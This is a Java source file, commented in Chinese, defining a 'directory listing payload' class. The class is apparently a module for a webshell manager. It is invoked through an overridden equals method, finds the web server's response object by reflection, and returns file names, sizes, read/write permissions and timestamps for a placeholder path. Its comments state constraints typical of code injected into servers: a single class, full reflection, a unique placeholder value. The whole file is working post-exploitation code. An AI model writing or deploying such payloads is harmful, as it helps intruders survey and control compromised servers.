// 目录列表载荷：输出 JSON 数组（n=名 d=目录 s=字节 r=可读 w=可写 m=mtime 毫秒）。
// 约束同 WsmProbe：默认包、全反射、单 class、占位值唯一、零跨类引用。
public class WsmList {

	public static final String p = "WSML-P0"; // 目录路径

	public boolean equals(Object ctx) {
		try {
			java.io.File[] fs = new java.io.File(p).listFiles();
			StringBuilder sb = new StringBuilder("[");
			if (fs != null) {
				for (java.io.File f : fs) {
					if (sb.length() > 1) sb.append(",");
					sb.append("{\"n\":\"").append(esc(f.getName()))
						.append("\",\"d\":").append(f.isDirectory())
						.append(",\"s\":").append(f.length())
						.append(",\"r\":").append(f.canRead())
						.append(",\"w\":").append(f.canWrite())
						.append(",\"m\":").append(f.lastModified())
						.append("}");
				}
			}
			sb.append("]");
			write(respOf(ctx), sb.toString());
		} catch (Throwable e) {
			try { write(respOf(ctx), "!ERR " + e); } catch (Throwable ignored) {}
		}
		return true;
	}

	static String esc(String s) {
		return s.replace("\\", "\\\\").replace("\"", "\\\"");
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) {
			Object[] a = (Object[]) ctx;
			return a.length > 1 ? a[1] : null;
		}
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
